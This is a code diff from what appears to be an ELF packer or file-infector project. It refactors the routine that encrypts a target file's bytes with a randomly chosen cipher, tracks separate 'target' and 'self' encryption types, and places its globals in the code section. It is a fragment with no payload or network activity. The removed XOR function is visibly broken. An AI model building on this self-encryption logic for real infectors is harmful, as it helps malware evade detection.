@@ -1,9 +1,13 @@
-#include "data.h"
-#include "encrypt.h"
+#include "crypt.h"
+#include "main.h"
 #include "syscall.h"
+
 
 uint8_t __attribute__((section(".text#"))) g_algo[ALGO_MAX] = {0};
 uint16_t __attribute__((section(".text#"))) g_algo_ri = 0;
+
+int8_t __attribute__((section(".text#"))) g_encrypt_type_target = -1;
+int8_t __attribute__((section(".text#"))) g_encrypt_type_self = -1;
 
 static inline uint8_t ft_nrand(void) {
 
@@ -16,30 +20,6 @@ static inline uint8_t ft_nrand(void) {
 	return rand;
 }
 
-
-static void xor_params_init(crypt_params_t *params) {
-	params->algo = XOR;
-	if (getrandom(params->params.xor_params.key, KEY_SIZE, 0) != KEY_SIZE) {
-		params->error = 1;
-	}
-}
-
-static void xor_encrypt(const crypt_params_t *params) {
-	const xor_params_t *xor_params = &params->params.xor_params;
-	for (size_t i = 0; i < params->data.src_size; i++) {
-		xor_params->key[i] ^= xor_params->key[i % KEY_SIZE];
-	}
-}
-
-t_encrypt_func get_encrypt_func(algo_t algo) {
-
-	switch (algo) {
-		case XOR:
-			return xor_encrypt;
-		default:
-			return NULL;
-	}
-}
 
 static t_params_init_func get_params_init_func(algo_t algo) {
 
@@ -66,18 +46,22 @@ static void crypt_params_init(crypt_params_t *params, algo_t algo, uint8_t *data
 	params->data.dst_size = size;
 }
 
-static int main_encrypt(data_t *data) {
+int crypt(data_t *data) {
 
-	(void)data;
+	if (g_is_encrypted) {
+		return 0;
+	}
 
 	crypt_params_t params;
 
 	algo_t algo = ft_nrand() % ALGO_MAX;
 
+	g_encrypt_type_target = algo;
+
 	t_params_init_func init_func = get_params_init_func(algo);
 	t_encrypt_func encrypt_func = get_encrypt_func(algo);
 
-	//crypt_params_init(&params, algo, algo_vars->data, algo_vars->size);
+	crypt_params_init(&params, algo, data->file, data->size);
 
 	if (init_func) {
 		init_func(&params);
@@ -92,23 +76,4 @@ static int main_encrypt(data_t *data) {
 	}
 
 	return 0;
-}
-
-void encrypt(uint8_t *data, const size_t size, uint8_t *key) {
-	for (size_t i = 0; i < size; i++) {
-		data[i] ^= key[i % KEY_SIZE];
-	}
-}
-
-void encrypt_offset(uint8_t *data, const size_t size, uint8_t *key, size_t offset) {
-	for (size_t i = 0; i < size; i++) {
-		data[i] ^= key[(i + offset) % KEY_SIZE];
-	}
-}
-
-void decrypt(uint8_t *data, const size_t size, uint8_t *key) {
-	for (size_t i = 0; i < size; i++) {
-		//data[i] ^= (key >> (8 * (i % 8))) & 0xFF;
-		data[i] ^= key[i % KEY_SIZE];
-	}
 }
